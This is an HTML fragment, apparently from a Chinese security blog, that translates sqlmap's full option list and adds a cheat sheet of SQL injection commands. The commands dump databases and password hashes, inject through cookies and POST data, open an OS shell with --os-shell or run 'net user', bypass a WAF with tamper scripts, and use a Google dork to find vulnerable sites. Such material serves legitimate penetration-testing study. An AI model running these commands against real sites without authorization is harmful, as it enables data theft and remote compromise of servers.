class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line">Usage: python sqlmap.py [options]</span><br><span class="line"> </span><br><span class="line">Options（选项）:</span><br><span class="line"> </span><br><span class="line">  -h, --help            Show basic help message and exit        显示此帮助消息并退出</span><br><span class="line">  -hh                   Show advanced help message and exit     展示先进的帮助信息并退出</span><br><span class="line">  --version             Show program&apos;s version number and exit  显示程序的版本号并退出</span><br><span class="line">  -v VERBOSE            Verbosity level: 0-6 (default 1)        详细级别：0-6（默认为1） </span><br><span class="line"> </span><br><span class="line">  Target（目标）:</span><br><span class="line"> </span><br><span class="line">    At least one of these options has to be provided to define the  </span><br><span class="line">    target(s)</span><br><span class="line">    以下至少需要设置其中一个选项，设置目标URL。</span><br><span class="line"> </span><br><span class="line">    -d DIRECT           Connection string for direct database connection        直接连接到数据库。</span><br><span class="line">    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)   目标URL。</span><br><span class="line">    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file   解析目标(s)从Burp或WebScarab代理日志文件</span><br><span class="line">    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file          解析目标(s)从远程站点地图文件(.xml)</span><br><span class="line">    -m BULKFILE         Scan multiple targets given in a textual file           扫描文本文件中给出的多个目标</span><br><span class="line">    -r REQUESTFILE      Load HTTP request from a file                           从文件加载HTTP请求</span><br><span class="line">    -g GOOGLEDORK       Process Google dork results as target URLs              处理Google dork的结果作为目标URL。</span><br><span class="line">    -c CONFIGFILE       Load options from a configuration INI file              从INI配置文件中加载选项。</span><br><span class="line"> </span><br><span class="line">  Request（请求）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to specify how to connect to the target URL   这些选项可以用来指定如何连接到目标URL。</span><br><span class="line"> </span><br><span class="line">    --method=METHOD     Force usage of given HTTP method (e.g. PUT)          强制使用给定的HTTP方法（e.g. PUT）</span><br><span class="line">    --data=DATA         Data string to be sent through POST                  通过POST发送的数据字符串</span><br><span class="line">    --param-del=PARA..  Character used for splitting parameter values        用于拆分参数值的字符</span><br><span class="line">    --cookie=COOKIE     HTTP Cookie header value                             HTTP Cookie头的值</span><br><span class="line">    --cookie-del=COO..  Character used for splitting cookie values           用于分割Cookie值的字符</span><br><span class="line">    --load-cookies=L..  File containing cookies in Netscape/wget format      包含Netscape / wget格式的cookie的文件</span><br><span class="line">    --drop-set-cookie   Ignore Set-Cookie header from response               从响应中忽略Set-Cookie头</span><br><span class="line">    --user-agent=AGENT  HTTP User-Agent header value                         指定 HTTP User - Agent头  </span><br><span class="line">    --random-agent      Use randomly selected HTTP User-Agent header value   使用随机选定的HTTP User - Agent头 </span><br><span class="line">    --host=HOST         HTTP Host header value                                HTTP主机头值</span><br><span class="line">    --referer=REFERER   HTTP Referer header value                             指定 HTTP Referer头</span><br><span class="line">    -H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)      额外header</span><br><span class="line">    --headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;) 额外header</span><br><span class="line">    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI) HTTP认证类型(Basic, Digest, NTLM or PKI)</span><br><span class="line">    --auth-cred=AUTH..  HTTP authentication credentials (name:password)       HTTP认证凭证(name:password)</span><br><span class="line">    --auth-file=AUTH..  HTTP authentication PEM cert/private key file         HTTP认证 PEM认证/私钥文件</span><br><span class="line">    --ignore-401        Ignore HTTP Error 401 (Unauthorized)                  忽略HTTP错误401(未经授权)</span><br><span class="line">    --proxy=PROXY       Use a proxy to connect to the target URL              使用代理连接到目标网址</span><br><span class="line">    --proxy-cred=PRO..  Proxy authentication credentials (name:password)      代理认证证书(name:password) </span><br><span class="line">    --proxy-file=PRO..  Load proxy list from a file                           从文件中加载代理列表</span><br><span class="line">    --ignore-proxy      Ignore system default proxy settings                  忽略系统默认代理设置</span><br><span class="line">    --tor               Use Tor anonymity network                             使用Tor匿名网络</span><br><span class="line">    --tor-port=TORPORT  Set Tor proxy port other than default                 设置Tor代理端口而不是默认值</span><br><span class="line">    --tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5) 设置Tor代理类型</span><br><span class="line">    --check-tor         Check to see if Tor is used properly                  检查Tor是否正确使用</span><br><span class="line">    --delay=DELAY       Delay in seconds between each HTTP request             每个HTTP请求之间的延迟（秒）</span><br><span class="line">    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30) 秒超时连接前等待（默认30）</span><br><span class="line">    --retries=RETRIES   Retries when the connection timeouts (default 3)       连接超时时重试（默认值3）</span><br><span class="line">    --randomize=RPARAM  Randomly change value for given parameter(s)           随机更改给定参数的值(s)</span><br><span class="line">    --safe-url=SAFEURL  URL address to visit frequently during testing         在测试期间频繁访问的URL地址</span><br><span class="line">    --safe-post=SAFE..  POST data to send to a safe URL                        POST数据发送到安全URL</span><br><span class="line">    --safe-req=SAFER..  Load safe HTTP request from a file                     从文件加载安全HTTP请求</span><br><span class="line">    --safe-freq=SAFE..  Test requests between two visits to a given safe URL   在两次访问给定安全网址之间测试请求</span><br><span class="line">    --skip-urlencode    Skip URL encoding of payload data                      跳过有效载荷数据的URL编码</span><br><span class="line">    --csrf-token=CSR..  Parameter used to hold anti-CSRF token                 参数用于保存anti-CSRF令牌</span><br><span class="line">    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token        提取anti-CSRF URL地址访问令牌</span><br><span class="line">    --force-ssl         Force usage of SSL/HTTPS                               强制使用SSL / HTTPS</span><br><span class="line">    --hpp               Use HTTP parameter pollution method                    使用HTTP参数pollution的方法</span><br><span class="line">    --eval=EVALCODE     Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码</span><br><span class="line">                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br><span class="line"> </span><br><span class="line">  Optimization（优化）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to optimize the performance of sqlmap    这些选项可用于优化sqlmap的性能</span><br><span class="line"> </span><br><span class="line">    -o                  Turn on all optimization switches                        开启所有优化开关</span><br><span class="line">    --predict-output    Predict common queries output                            预测常见的查询输出</span><br><span class="line">    --keep-alive        Use persistent HTTP(s) connections                       使用持久的HTTP（S）连接</span><br><span class="line">    --null-connection   Retrieve page length without actual HTTP response body   从没有实际的HTTP响应体中检索页面长度</span><br><span class="line">    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)    最大的HTTP（S）请求并发量（默认为1）</span><br><span class="line"> </span><br><span class="line">  Injection（注入）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to specify which parameters to test for,</span><br><span class="line">    provide custom injection payloads and optional tampering scripts </span><br><span class="line">    这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</span><br><span class="line"> </span><br><span class="line">    -p TESTPARAMETER    Testable parameter(s)                                      可测试的参数（S）</span><br><span class="line">    --skip=SKIP         Skip testing for given parameter(s)                        跳过对给定参数的测试</span><br><span class="line">    --skip-static       Skip testing parameters that not appear to be dynamic      跳过测试不显示为动态的参数</span><br><span class="line">    --param-exclude=..  Regexp to exclude parameters from testing (e.g. &quot;ses&quot;)     使用正则表达式排除参数进行测试（e.g. &quot;ses&quot;）</span><br><span class="line">    --dbms=DBMS         Force back-end DBMS to this value                          强制后端的DBMS为此值  </span><br><span class="line">    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)            DBMS认证凭证(user:password) </span><br><span class="line">    --os=OS             Force back-end DBMS operating system to this value         强制后端的DBMS操作系统为这个值</span><br><span class="line">    --invalid-bignum    Use big numbers for invalidating values                    使用大数字使值无效</span><br><span class="line">    --invalid-logical   Use logical operations for invalidating values             使用逻辑操作使值无效</span><br><span class="line">    --invalid-string    Use random strings for invalidating values                 使用随机字符串使值无效</span><br><span class="line">    --no-cast           Turn off payload casting mechanism                         关闭有效载荷铸造机制</span><br><span class="line">    --no-escape         Turn off string escaping mechanism                         关闭字符串转义机制</span><br><span class="line">    --prefix=PREFIX     Injection payload prefix string                            注入payload字符串前缀</span><br><span class="line">    --suffix=SUFFIX     Injection payload suffix string                            注入payload字符串后缀  </span><br><span class="line">    --tamper=TAMPER     Use given script(s) for tampering injection data           使用给定的脚本（S）篡改注入数据</span><br><span class="line"> </span><br><span class="line">  Detection（检测）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to customize the detection phase 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</span><br><span class="line"> </span><br><span class="line">    --level=LEVEL       Level of tests to perform (1-5, default 1)          执行测试的等级（1-5，默认为1）</span><br><span class="line">    --risk=RISK         Risk of tests to perform (1-3, default 1)           执行测试的风险（0-3，默认为1）</span><br><span class="line">    --string=STRING     String to match when query is evaluated to True     查询时有效时在页面匹配字符串 </span><br><span class="line">    --not-string=NOT..  String to match when query is evaluated to False    当查询求值为无效时匹配的字符串</span><br><span class="line">    --regexp=REGEXP     Regexp to match when query is evaluated to True     查询时有效时在页面匹配正则表达式</span><br><span class="line">    --code=CODE         HTTP code to match when query is evaluated to True  当查询求值为True时匹配的HTTP代码</span><br><span class="line">    --text-only         Compare pages based only on the textual content     仅基于在文本内容比较网页</span><br><span class="line">    --titles            Compare pages based only on their titles            仅根据他们的标题进行比较</span><br><span class="line"> </span><br><span class="line">  Techniques（技巧）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to tweak testing of specific SQL injection</span><br><span class="line">    techniques </span><br><span class="line">    这些选项可用于调整具体的SQL注入测试。 </span><br><span class="line"> </span><br><span class="line">    --technique=TECH    SQL injection techniques to use (default &quot;BEUSTQ&quot;)      SQL注入技术测试（默认BEUST）</span><br><span class="line">    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)          DBMS响应的延迟时间（默认为5秒）</span><br><span class="line">    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection  定列范围用于测试UNION查询注入</span><br><span class="line">    --union-char=UCHAR  Character to use for bruteforcing number of columns     用于暴力猜解列数的字符</span><br><span class="line">    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection  要在UNION查询SQL注入的FROM部分使用的表</span><br><span class="line">    --dns-domain=DNS..  Domain name used for DNS exfiltration attack            域名用于DNS漏出攻击</span><br><span class="line">    --second-order=S..  Resulting page URL searched for second-order response   生成页面的URL搜索为second-order响应</span><br><span class="line"> </span><br><span class="line">  Fingerprint（指纹）:</span><br><span class="line"> </span><br><span class="line">    -f, --fingerprint   Perform an extensive DBMS version fingerprint           执行检查广泛的DBMS版本指纹</span><br><span class="line"> </span><br><span class="line">  Enumeration（枚举）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to enumerate the back-end database</span><br><span class="line">    management system information, structure and data contained in the</span><br><span class="line">    tables. Moreover you can run your own SQL statements                  </span><br><span class="line">    这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。  </span><br><span class="line"> </span><br><span class="line">    -a, --all           Retrieve everything                             检索一切</span><br><span class="line">    -b, --banner        Retrieve DBMS banner                            检索数据库管理系统的标识  </span><br><span class="line">    --current-user      Retrieve DBMS current user                      检索数据库管理系统的标识  </span><br><span class="line">    --current-db        Retrieve DBMS current database                  检索数据库管理系统当前数据库  </span><br><span class="line">    --hostname          Retrieve DBMS server hostname                   检索数据库服务器的主机名</span><br><span class="line">    --is-dba            Detect if the DBMS current user is DBA          检测DBMS当前用户是否DBA  </span><br><span class="line">    --users             Enumerate DBMS users                            枚举数据库管理系统用户</span><br><span class="line">    --passwords         Enumerate DBMS users password hashes            枚举数据库管理系统用户密码哈希</span><br><span class="line">    --privileges        Enumerate DBMS users privileges                 枚举数据库管理系统用户的权限  </span><br><span class="line">    --roles             Enumerate DBMS users roles                      枚举数据库管理系统用户的角色  </span><br><span class="line">    --dbs               Enumerate DBMS databases                        枚举数据库管理系统数据库</span><br><span class="line">    --tables            Enumerate DBMS database tables                  枚举的DBMS数据库中的表  </span><br><span class="line">    --columns           Enumerate DBMS database table columns           枚举DBMS数据库表列</span><br><span class="line">    --schema            Enumerate DBMS schema                           枚举数据库架构</span><br><span class="line">    --count             Retrieve number of entries for table(s)         检索表的条目数</span><br><span class="line">    --dump              Dump DBMS database table entries                转储数据库管理系统的数据库中的表项</span><br><span class="line">    --dump-all          Dump all DBMS databases tables entries               转储数据库管理系统的数据库中的表项</span><br><span class="line">    --search            Search column(s), table(s) and/or database name(s)   搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">    --comments          Retrieve DBMS comments                               检索数据库的comments(注释、评论)</span><br><span class="line">    -D DB               DBMS database to enumerate                           要进行枚举的数据库名 </span><br><span class="line">    -T TBL              DBMS database table(s) to enumerate                  要进行枚举的数据库表</span><br><span class="line">    -C COL              DBMS database table column(s) to enumerate           要进行枚举的数据库列 </span><br><span class="line">    -X EXCLUDECOL       DBMS database table column(s) to not enumerate       要不进行枚举的数据库列 </span><br><span class="line">    -U USER             DBMS user to enumerate                               用来进行枚举的数据库用户 </span><br><span class="line">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables   枚举表时排除系统数据库 </span><br><span class="line">    --pivot-column=P..  Pivot column name                                       主列名称</span><br><span class="line">    --where=DUMPWHERE   Use WHERE condition while table dumping                 使用WHERE条件进行表转储</span><br><span class="line">    --start=LIMITSTART  First query output entry to retrieve                    第一个查询输出进入检索</span><br><span class="line">    --stop=LIMITSTOP    Last query output entry to retrieve                     最后查询的输出进入检索</span><br><span class="line">    --first=FIRSTCHAR   First query output word character to retrieve           第一个查询输出字的字符检索 </span><br><span class="line">    --last=LASTCHAR     Last query output word character to retrieve            最后查询的输出字字符检索 </span><br><span class="line">    --sql-query=QUERY   SQL statement to be executed                            要执行的SQL语句</span><br><span class="line">    --sql-shell         Prompt for an interactive SQL shell                     提示交互式SQL的shell</span><br><span class="line">    --sql-file=SQLFILE  Execute SQL statements from given file(s)               从给定文件执行SQL语句</span><br><span class="line"> </span><br><span class="line">  Brute force（蛮力）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to run brute force checks         这些选项可以被用来运行蛮力检查。</span><br><span class="line"> </span><br><span class="line">    --common-tables     Check existence of common tables        检查存在共同表 </span><br><span class="line">    --common-columns    Check existence of common columns       检查存在共同列</span><br><span class="line"> </span><br><span class="line">  User-defined function injection（用户自定义函数注入）:</span><br><span class="line">    These options can be used to create custom user-defined functions   这些选项可以用来创建用户自定义函数。</span><br><span class="line"> </span><br><span class="line">    --udf-inject        Inject custom user-defined functions        注入用户自定义函数  </span><br><span class="line">    --shared-lib=SHLIB  Local path of the shared library            共享库的本地路径 </span><br><span class="line"> </span><br><span class="line">  File system access（访问文件系统）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to access the back-end database management      </span><br><span class="line">    system underlying file system</span><br><span class="line">    这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span><br><span class="line"> </span><br><span class="line">    --file-read=RFILE   Read a file from the back-end DBMS file system        从后端的数据库管理系统文件系统读取文件  </span><br><span class="line">    --file-write=WFILE  Write a local file on the back-end DBMS file system   编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">    --file-dest=DFILE   Back-end DBMS absolute filepath to write to           后端的数据库管理系统写入文件的绝对路径</span><br><span class="line"> </span><br><span class="line">  Operating system access（操作系统访问）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system underlying operating system  </span><br><span class="line">    这些选项可以用于访问后端数据库管理系统的底层操作系统。</span><br><span class="line"> </span><br><span class="line">    --os-cmd=OSCMD      Execute an operating system command                     执行操作系统命令 </span><br><span class="line">    --os-shell          Prompt for an interactive operating system shell        交互式的操作系统的shell</span><br><span class="line">    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC             获取一个OOB shell，meterpreter或VNC </span><br><span class="line">    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC   一键获取一个OOB shell，meterpreter或VNC </span><br><span class="line">    --os-bof            Stored procedure buffer overflow exploitation           存储过程缓冲区溢出利用</span><br><span class="line">    --priv-esc          Database process user privilege escalation              数据库进程用户权限提升</span><br><span class="line">    --msf-path=MSFPATH  Local path where Metasploit Framework is installed      Metasploit Framework本地的安装路径</span><br><span class="line">    --tmp-path=TMPPATH  Remote absolute path of temporary files directory       远程临时文件目录的绝对路径</span><br><span class="line"> </span><br><span class="line">  Windows registry access（Windows注册表访问）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to access the back-end database management</span><br><span class="line">    system Windows registry     </span><br><span class="line">    这些选项可以被用来访问后端数据库管理系统Windows注册表。</span><br><span class="line"> </span><br><span class="line">    --reg-read          Read a Windows registry key value           读一个Windows注册表项值</span><br><span class="line">    --reg-add           Write a Windows registry key value data     写一个Windows注册表项值数据</span><br><span class="line">    --reg-del           Delete a Windows registry key value         删除Windows注册表键值</span><br><span class="line">    --reg-key=REGKEY    Windows registry key                        Windows注册表键 </span><br><span class="line">    --reg-value=REGVAL  Windows registry key value                  Windows注册表项值 </span><br><span class="line">    --reg-data=REGDATA  Windows registry key value data             Windows注册表键值数据  </span><br><span class="line">    --reg-type=REGTYPE  Windows registry key value type             Windows注册表项值类型</span><br><span class="line"> </span><br><span class="line">  General（一般）:</span><br><span class="line"> </span><br><span class="line">    These options can be used to set some general working parameters    这些选项可以用来设置一些一般的工作参数。 </span><br><span class="line"> </span><br><span class="line">    -s SESSIONFILE      Load session from a stored (.sqlite) file                   保存和恢复检索会话文件的所有数据</span><br><span class="line">    -t TRAFFICFILE      Log all HTTP traffic into a textual file                    记录所有HTTP流量到一个文本文件中</span><br><span class="line">    --batch             Never ask for user input, use the default behaviour         从不询问用户输入，使用所有默认配置。 </span><br><span class="line">    --binary-fields=..  Result fields having binary values (e.g. &quot;digest&quot;)          具有二进制值的结果字段</span><br><span class="line">    --charset=CHARSET   Force character encoding used for data retrieval            强制用于数据检索的字符编码</span><br><span class="line">    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL              从目标网址开始抓取网站</span><br><span class="line">    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &quot;logout&quot;)       正则表达式排除网页抓取</span><br><span class="line">    --csv-del=CSVDEL    Delimiting character used in CSV output (default &quot;,&quot;)       分隔CSV输出中使用的字符</span><br><span class="line">    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)       转储数据的格式</span><br><span class="line">    --eta               Display for each output the estimated time of arrival       显示每个输出的预计到达时间</span><br><span class="line">    --flush-session     Flush session files for current target                      刷新当前目标的会话文件</span><br><span class="line">    --forms             Parse and test forms on target URL                          在目标网址上解析和测试表单</span><br><span class="line">    --fresh-queries     Ignore query results stored in session file                 忽略在会话文件中存储的查询结果</span><br><span class="line">    --hex               Use DBMS hex function(s) for data retrieval                 使用DBMS hex函数进行数据检索</span><br><span class="line">    --output-dir=OUT..  Custom output directory path                                自定义输出目录路径</span><br><span class="line">    --parse-errors      Parse and display DBMS error messages from responses        解析和显示响应中的DBMS错误消息</span><br><span class="line">    --save=SAVECONFIG   Save options to a configuration INI file                    保存选项到INI配置文件</span><br><span class="line">    --scope=SCOPE       Regexp to filter targets from provided proxy log            使用正则表达式从提供的代理日志中过滤目标</span><br><span class="line">    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)           根据有效负载和/或标题(e.g. ROW)选择测试</span><br><span class="line">    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)       根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span><br><span class="line">    --update            Update sqlmap                                                更新SqlMap</span><br><span class="line"> </span><br><span class="line">  Miscellaneous（杂项）:</span><br><span class="line"> </span><br><span class="line">    -z MNEMONICS        Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;)         使用简短的助记符</span><br><span class="line">    --alert=ALERT       Run host OS command(s) when SQL injection is found      在找到SQL注入时运行主机操作系统命令</span><br><span class="line">    --answers=ANSWERS   Set question answers (e.g. &quot;quit=N,follow=N&quot;)           设置问题答案</span><br><span class="line">    --beep              Beep on question and/or when SQL injection is found     发现SQL注入时提醒</span><br><span class="line">    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables   SqlMap具体的UDF和表清理DBMS </span><br><span class="line">    --dependencies      Check for missing (non-core) sqlmap dependencies        检查是否缺少（非内核）sqlmap依赖关系</span><br><span class="line">    --disable-coloring  Disable console output coloring                         禁用控制台输出颜色</span><br><span class="line">    --gpage=GOOGLEPAGE  Use Google dork results from specified page number      使用Google dork结果指定页码</span><br><span class="line">    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection    对WAF / IPS / IDS保护进行全面测试</span><br><span class="line">    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection      跳过启发式检测WAF / IPS / IDS保护</span><br><span class="line">    --mobile            Imitate smartphone through HTTP User-Agent header       通过HTTP User-Agent标头模仿智能手机</span><br><span class="line">    --offline           Work in offline mode (only use session data)            在离线模式下工作（仅使用会话数据）</span><br><span class="line">    --page-rank         Display page rank (PR) for Google dork results          Google dork结果显示网页排名（PR）</span><br><span class="line">    --purge-output      Safely remove all content from output directory         安全地从输出目录中删除所有内容</span><br><span class="line">    --smart             Conduct thorough tests only if positive heuristic(s)    只有在正启发式时才进行彻底测试</span><br><span class="line">    --sqlmap-shell      Prompt for an interactive sqlmap shell                  提示交互式sqlmap shell</span><br><span class="line">    --wizard            Simple wizard interface for beginner users              给初级用户的简单向导界面</span><br></pre></td></tr></table></figure><br>还有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">SQLMAP实战操作：</span><br><span class="line"></span><br><span class="line">1.ACCESS数据库：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” /*-u为常规扫描参数*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tables /*–tables拆数据库表*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –columns -T “要拆的表名”/*列出指定表名*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dump -T “要拆的表名”-C “要拆的字段名” /*–dump为拆解字段名会保存在sqlmap/output目录下*/</span><br><span class="line"></span><br><span class="line">2.MYSQL数据库：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” /*扫描注入点*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dbs /*列出所有数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-db /*列出当前数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-user /*列出当前用户*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”</span><br><span class="line"></span><br><span class="line">3.SQLSERVER数据库：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” /*扫描注入点*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dbs /*列出所有数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-db /*列出当前数据库*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –current-user /*列出当前用户*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”</span><br><span class="line"></span><br><span class="line">SQLSERVER操作和MYSQL是一样的！！！常见的几种数据库！！！</span><br><span class="line"></span><br><span class="line">4.COOKIE注入：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “www.xxx.com/asp或者www.xxx.com/php”?–cookie “参数名如id=1” –level 2/*level为提升权限*/</span><br><span class="line"></span><br><span class="line">什么数据库就按照上面的数据库加上cookie语句拆解就行了</span><br><span class="line"></span><br><span class="line">5.POST注入：</span><br><span class="line"></span><br><span class="line">抓包保存到SQLMAP目录下.txt的文件然后输入指令sqlmap.py -r xxx.txt /*xxx.txt为保存包文件的文件名”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –data “POST参数”</span><br><span class="line"></span><br><span class="line">6.执行shell命令：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –os-cmd=”net user” /*执行net user命令*/</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –os-shell /*系统交互的shell*/</span><br><span class="line"></span><br><span class="line">7.注入HTTP请求 :</span><br><span class="line"></span><br><span class="line">sqlmap.py -r xxx.txt –dbs /*xxx.txt内容为HTTP请求*/</span><br><span class="line"></span><br><span class="line">8.绕过WAF的tamper插件使用：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tamper “xxx.py”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url” –tamper=”xxx.py”</span><br><span class="line"></span><br><span class="line">关于tamper脚本详细说明在本博客中有，链接为：http://www.matsec.cn/?id=5</span><br><span class="line"></span><br><span class="line">9.将注入语句插入到指定位置：</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “url(www.xxx.com/id/1*.html)”?–dbs</span><br><span class="line"></span><br><span class="line">有些网站是采用伪静态的页面使用SQLMAP的普通注入是不行的，所以SQLMAP提供了”*”参数将SQL语句插入指定位置，一般用于伪静态注入。</span><br><span class="line"></span><br><span class="line">在使用HTTP注入时使用-r参数也可以直接在文本中添加*号</span><br><span class="line"></span><br><span class="line">10.延时注入：</span><br><span class="line"></span><br><span class="line">sqlmap –dbs -u “url” –delay 0.5 /*延时0.5秒*/</span><br><span class="line"></span><br><span class="line">sqlmap –dbs -u “url” –safe-freq /*请求2次*/</span><br><span class="line"></span><br><span class="line">11.使用谷歌语法搜索注入(Google hack)：</span><br><span class="line"></span><br><span class="line">sqlmap.py -g “inurl:asp?id=1” /*””内为搜索语法，如：inurl,intitle,site,filetype</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
